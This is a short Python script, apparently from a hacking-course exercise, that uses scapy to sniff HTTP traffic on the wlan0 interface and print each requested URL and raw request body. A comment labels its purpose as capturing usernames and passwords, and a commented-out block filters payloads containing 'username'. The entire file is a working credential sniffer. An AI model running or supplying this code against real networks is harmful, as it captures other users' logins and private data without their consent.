#!/usr/bin/env python3

import scapy.all as scapy 
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def process_sniffed_packet(packet): # usernames and passwords
    if packet.haslayer(http.HTTPRequest):  #filters on http
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print(url.decode())

        if packet.haslayer(scapy.Raw):     #filters on Raw
            print(packet[scapy.Raw].load.decode())
               
    
sniff("wlan0")



#izpolzvai packet.show() za da vidish kvo drugi polezno moje da printirash

"""
            load = packet[scapy.Raw].load #prints from load from Raw
            if "username" in load:
                print(load)

"""